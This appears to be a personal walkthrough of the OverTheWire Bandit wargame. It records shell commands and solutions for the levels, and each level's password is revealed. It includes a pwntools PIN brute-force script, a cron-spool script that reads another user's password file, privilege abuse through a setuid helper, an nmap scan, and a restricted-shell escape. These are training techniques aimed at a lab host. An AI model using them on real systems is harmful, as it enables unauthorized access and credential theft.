ssh is the protocol to login.
ssh usage:
```
<USRNAME>@<SERVER-CONNECTION-ADDRESS>
```
to specify a differnt port you will need to specify the ``` -p ``` FLAG

It then asks for a Passowrd which in this case is **bandit0**

once logged in we run the command `ls`. this shows us all the different files in the current directory. 

We see the file **readme** to see the content we can use the command `cat`. 
this will then display the password which we then use to login to Level1

when loggin and run the `ls` command we found a file called `-`. to be abel to **cat** this file we need to prepend it with `./`

so the final command looks like
```bash
cat ./-
```
we then recieve the pwd for the next level

here we were greted with a file which had **spaces** in its file name.
to be able to get the content from this fiel we utalise `\` infront of each space. Or the other option is to use the buildin autocomplete function with can be accessed via  TABing.

the command will look like this:
```bash
cat spaces\ in\ this\ filename
```
and then we get the password for the next level

in this level we were given a directory called `inhere`. once we navigated into it and ran the normal `ls` command we wouldnt find any further information. but when running `ls -a` this then reveald a hidden file. these are prenoted with a dot at the front.

the command looks like this:
```bash
cat .hidden
```

and then we get the password for the next level

we have been told to find the file in `inthere` folder. in here we have been told it should be human redable.
this can be done with:
```bash
file ./-*
	./-file00: data
	./-file01: data
	./-file02: data
	./-file03: data

	./-file07: ASCII text
	./-file08: data
	./-file09: data
```
the password is
when reading the content for the file `./file07` we get the password for the next level.

when we first run `ls` we dont seem to find any files.

we have been given the infomation
```text
	owned by user bandit7
	owned by group bandit6
	33 bytes in size
```
we then use the same command as before but this time we add some more parametersas seen below

we have been given a text file called `data.txt`. in there next to the word `millionth` we will find the password.
the method used is grep.

```bash
cat data.txt | grep millionth
	millionth	cvX2JJa4CFALtqS87jk27qwqGhBM9plV

For this level we had to read the content from the file and `sort` it. this can be done by piping the content to another command. from there we use `uniq -u` to show us the only uniq string in the file

```bash
cat data.txt | sort | uniq -u
	UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR

here we had to `read` the data and `sort` it again. afterwards we then got all the `strings` outputted from there we got the password.

We gotten a file and when first looking at it it doesnt look like much. When we send the data into a base64 decoder which is done with `base64 -d` we get the password.
```bash
cat data.txt | base64 -d
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR

first step is to move the file into a temporanry directory.
this is done by 
```bash
mkdir /tmp/<DIRECTORY-NAME> && cd /tmp/<DIRECTORY-NAME>
cp ~/<FILE-NAME> .
```
once we have the file there we canstart looking at what the file contains.
```bash
file data.txt 
	data.txt: ASCII text
```
when we cat the content we get this as a result:

```

The next Step is to then reconstruct the Hexdump. to do this we use the `xxd` programm and create a new file while extracting the data. 

```bash
	xxd -r data.txt data1
```

the next step is to inspect what file type it is and if we can already view the content.

```bash
file data1
	data1: gzip compressed data, was "data2.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
```

this shows us that the file is a gzip compressed file. this means that we still have some more work to do. lets continue.

A gzip file should have the ending of `.gz` this means we have to rename/move the just created file to have this.

```bash
	mv data1 data1.gz
```

We then run `gzip` against this file to extract the content.

```bash
	gzip -d data1.gz
```

once this is completed we will be given a file called `data1`.

we then inspect it again.

```bash
file data1
	data1: bzip2 compressed data, block size = 900k
```

this now shows us that it is a `bzip2` file, these have the `.bz2` ending on the files. we now need to change that again as before..

```bash
	mv data1 data2.bz2
```

once we have done that we can then run `bzip2` against it to see what it contains.

```bash
	bzip2 -d data2.bz2
```

we have now been given another file. lets check this content.

```bash
file data2
	data2: gzip compressed data, was "data4.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
```

it is another `gzip` so we do the same thing as befor.

```bash
	mv data2 data3.gz
```

now we can run `gzip against it again.

```bash
	gzip -d data3.gz
```

this then gives us a file called `gzip3`. 

lets check this file out.

```bash
file data3
	data3: POSIX tar archive (GNU)
```

[how to use Tar](https://www.computerhope.com/unix/utar.htm)

we then have to use tar to extract the file content.

```bash
tar -xvf data3
	data5.bin
```
x is for extract
f is for file
v is for verbose

when inspecting the `data5.bin` file we get the following response.

```bash
file data5.bin
	data5.bin: POSIX tar archive (GNU)
```

this means we have to do the same again as befor.

```bash
tar -xvf data5.bin
	data6.bin
```

this gives us another file. lets check it out.

```bash
file data6.bin
	data6.bin: bzip2 compressed data, block size = 900k
```

this time we have been given a `bzip2` file again.
lets move it to a new file and have the correct ending. and then also run the right command against it also as commands can be concatinated with `&&`

```bash
mv data6.bin data7.bz2 && bzip2 -d data7.bz2 && file data7
	data7: POSIX tar archive (GNU)
```

we can see that now we have been given another `tar` file. lets extract it again

```bash
 tar -xvf data7 && file data8.bin
	data8.bin
	data8.bin: gzip compressed data, was "data9.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
```

lets unzip this newly won file.

```bash
mv data8.bin data9.gz && gzip -d data9.gz
```

this then gives us `data9` as a file.

when we check the type of the new file we should get this result.

```bash
file data9
	data9: ASCII text
```

we then retrieve the data from this file

```bash
cat data9
	The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
```

for this level e have to login via ssh to the other server with the private key.
this can be done with the `-i` flag. 

```bash
ssh bandit14@localhost -i sshkey.private
```

we then read the content from the file and retrieve the password

As we have been told that we have to connect to port `30000 on localhost`. this can be done with telnet.
we give it the password from the current user and get the pwd for the next level.

```bash
telnet localhost 30000
	Trying 127.0.0.1...
	Connected to localhost.
	Escape character is '^]'.
	4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e

for this level we have to connect to a server running on local host with an openport of 30001.

this can be done with openssl.
it then asks us for the password which we provide it with and then it gives us back the pwd for the next level.
```bash
openssl s_client -connect localhost:30001

to discover open ports on a device we use Nmap. the `-vvv` is that it shows us the infomation gatherd staright away rather then at the end. `-p 31000-32000` is the reange of ports we are interested in.

```bash

nmap -vvv localhost -p 31000-32000

	Starting Nmap 7.40 ( https://nmap.org ) at 2020-04-16 03:44 CEST

```

Once we know the port which is open we then used openssl to connec to it. and providing it the password we are given a ssh private key.

```bash
openssl s_client -connect localhost:31790

we then fist had to change the permission of the file 
```bash
	chmod 600 test.private 
```

the next step is then to login to level 17 with the private key.

```bash
ssh bandit17@localhost -i test.private
```

the next step is to recover the password for the current level.

```bash
cat /etc/bandit_pass/bandit17

when we login to this level we automaticaly get logged out. we can provide a command when ssh into the server and that way we can retrieve the password from the file.

```bash
ssh bandit18@bandit.labs.overthewire.org -p 2220  cat readme

we have been given a file which wen run sas that it will run a command as another user.

```bash
./bandit20-do 
	Run a command as another user.
	Example: ./bandit20-do id
```

we then see that it gives us a example on how to use this scipt.

```bash
./bandit20-do id
	uid=11019(bandit19) gid=11019(bandit19)
	euid=11020(bandit20) groups=11019(bandit19)
```

when we compare it to just running id
```bash
 id
	uid=11019(bandit19) gid=11019(bandit19)
	groups=11019(bandit19)
```

we notice that there is an extra `euid` in when running it with the script. this is a effective UID. this can be used to use a uid number from a different user.
in our case we can give the program any command and it will run it as Bandit20.

```bash
./bandit20-do cat /etc/bandit_pass/bandit20
	GbKksEFF4yrVs6il55v6gwY5aVje5f0j

when we login we discover that there is a script we can execute. when we run it we get the following response.

```bash
./suconnect 
	Usage: ./suconnect <portnumber>
	This program will connect to the given port on
	localhost using TCP. If it receives the correct
	password from the other side, the next password
	is transmitted back.
```

it tells us that the programm connects to a portnumber we have to provide it.

We can create a NetCat (nc) listener on a free port and then connect the script to it.

to have a nc listener running we have to open a second terminal and login as the same user.

```bash
nc -lvp 8888
	listening on [any] 8888 ...
```

in our case we have specified to have it run on port 8888.

now we connect the script to the just specified port.

```bash
./suconnect 8888

```
the program will be waiting for some input from the listener

we can now provide it with the password for the current level.

```bash
nc -lvp 8888
	listening on [any] 8888 ...
	connect to [127.0.0.1] from localhost [127.0.0.1] 42446
	GbKksEFF4yrVs6il55v6gwY5aVje5f0j
```
on the script terminal we get following response

```bash
./suconnect 8888
	Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
	Password matches, sending next password
```
it has compared the passwords and then send back the password for the next level.

```bash
nc -lvp 8888
	listening on [any] 8888 ...
	connect to [127.0.0.1] from localhost [127.0.0.1] 42446
	GbKksEFF4yrVs6il55v6gwY5aVje5f0j

the first step was to navigate into the directory they said we can inspect the different cronjobs running.
```bash
	cd /etc/cron.d
```
in there we see multiple files
```bash
ls -lash

	4.0K -rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
```

we see that there is a cronjob for Bandit22.
lets see what it contains.

```bash
cat cronjob_bandit22
	@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
	* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
```
this tells us that this script is run every munute. aswell as it shares where it is located. lets see if we can read the script.

```bash
cat /usr/bin/cronjob_bandit22.sh 
	#!/bin/bash
	chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
	cat /etc/bandit_pass/bandit22 >
		/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```
here we can see that it is outputting the content into a temporay file.

```bash
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

we see that there is a cronjob for Bandit22.
lets see what it contains.

```bash
cat cronjob_bandit23
	@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
	* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
```
this tells us that this script is run every munute. aswell as it shares where it is located. lets see if we can read the script.

```bash
cat /usr/bin/cronjob_bandit23.sh 
	#!/bin/bash

	myname=$(whoami)
	mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

	echo "Copying passwordfile
		/etc/bandit_pass/$myname to /tmp/$mytarget"

	cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

lets see what `whoami` does.

```bash
whoami
	bandit22
```

we can see that user bandit23 for this file but when we will run it it will get the current username which would be bandit22 and therfor not giving us the right password.

lets see what happens when we change `$myname` to `bandit23`.

```bash
mytarget=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
$mytarget
	-bash: 8ca319486bfbbc3663ea0fbe81326349: command not found
```

we then get a md5 hash. lets see if we can use this hash to then retrieve the password.

```bash
cat /tmp/8ca319486bfbbc3663ea0fbe81326349

the first step was to navigate into the directory they said we can inspect the different cronjobs running.
```bash
	cd /etc/cron.d
```
in there we see multiple files
```bash

	4.0K -rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
```

we see that there is a cronjob for Bandit22.
lets see what it contains.

```bash
cat cronjob_bandit24
	@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
	* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

now lets navigate to the file and see what it does.

```bash
cat /usr/bin/cronjob_bandit24.sh 
	#!/bin/bash

	myname=$(whoami)

	cd /var/spool/$myname
	echo "Executing and deleting all scripts in /var/spool/$myname:"
	for i in * .*;
	do
	    if [ "$i" != "." -a "$i" != ".." ];
    	then
		echo "Handling $i"
		timeout -s 9 60 ./$i
		rm -f ./$i
    	fi
	done
```

to be abel to get the password we will have to write our own script and then grab the password with it.

```bash
nano bandit24.sh 
	#!/bin/bash
	cat /etc/bandit_pass/bandit24 >> /tmp/user99/lv24
```

this will get what is stored in one file and pass it to the defined file.

we first had to give the file and folder permison to be able to be run from the cron job

```bash
	chmod 777 bandit24.sh
	cp bandit24.sh  /var/spool/bandit24/
	chmod 777 /tmp/user99
```

after waiting for a bit we can use `watch` to see when the new file is created

```bash
	watch -n 1 ls
```

we can see that the file `lv24` was created. lets get the content.

```bash
cat lv24 
	UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

here the challenge was to bruteforce a 4digit pincode. this was not able to be done manualy due to the amount of combinations.

for this i did some research. and found a tool called `PWN-TOOLS`.

this is a script which makes multiple connections and trys the password. once it finds the right combo it will then stop.

```python
#!/usr/bin/python
from pwn import *
from multiprocessing import Process

def brute(nrOne,nrTwo):
    for pin in range(nrOne,nrTwo):
        pin = str(pin).zfill(4)

        r = remote('127.0.0.1', 30002)
        r.recv()
        r.send('UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ' + pin + '\n')

        if 'Wrong' not in r.recvline():
            print '[+] Successful -> ' + pin
            print r.recvline()
            r.close()
        else:
            if int(pin) % 100 == 0:
                print '[!] Failed -> ' + pin
            r.close()

if __name__=='__main__':
    p1 = Process(target = brute, args = (0,2500,))
    p2 = Process(target = brute, args = (2500,5000,))
    p3 = Process(target = brute, args = (5000,7500,))
    p4 = Process(target = brute, args = (7500,10000,))
    p1.start()
    p2.start()
    p3.start()
    p4.start()

```

we casn see that the script ened after finding the right pincode. which in ourcase was 9403.

here we are given a script which runs as a differnt user privelige.
we can use this to get the other user to read its own password for us.

We have been given a git repository and told the password is somewhere in there.
lets first clone it and then check it out.
There was nothing in the ReadMe file. lets see what the logs tell us.

we can see that there are multiple logs.

with `git checkout ` we can navigate to the required log and then read the contents of each file
```
git checkout 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
	Previous HEAD position was b67405d... initial commit of README.md
	HEAD is now at 186a103... add missing data
```
lets read the content.
```

We have been given a git repository and told the password is somewhere in there.
lets first clone it and then check it out.
There was nothing in the ReadMe file. 
git also lets us create branches.

with `git branch -a` we can list all of them. 
we see that there is a development branch. lets check that out.

```
git checkout origin/dev
	Previous HEAD position was 84abedc... fix username
	HEAD is now at 33ce2e9... add data needed for development
```
Lets read the content

We have been given a git repository and told the password is somewhere in there.
lets first clone it and then check it out. Lets see what the readme file contains.

HMMMMM nothing of intetrests.
```
cat README.md 
	just an epmty file... muahaha
```
git log doesnt give us anything of interest aswell. :/ what else can we do??
```bash
git log
	commit 3aa4c239f729b07deb99a52f125893e162daac9e
	Author: Ben Dover <noone@overthewire.org>
	Date:   Tue Oct 16 14:00:44 2018 +0200

    initial commit of README.md
```
well git can also have `tags ` associated with their commits.
lets see if their are any tags. and if so then display the content
```bash
git tag -l
	secret

git show secret 
	47e603bb428404d265f59c42920d81e5

for this we had to create a file called `key.txt` and give it the content `May i come in?`.

when we then push it to the branch as seen below we can get the password.

```text

this was a wierd level.
Every command you type got made into UPPERCASE.

there is a way to invoke a shell.

when typing `$0` we can then type a command without having it transposed to uppercase.
this can then be enforeced with `echo $0`. after that we can get the password.

```
WELCOME TO THE UPPERCASE SHELL
>> ls
	sh: 1: LS: not found
>> $0
	$ echo $0
sh
$ cat /etc/bandit_pass/bandit33
	c9c3199ddf4121b10cf581a98d51caee
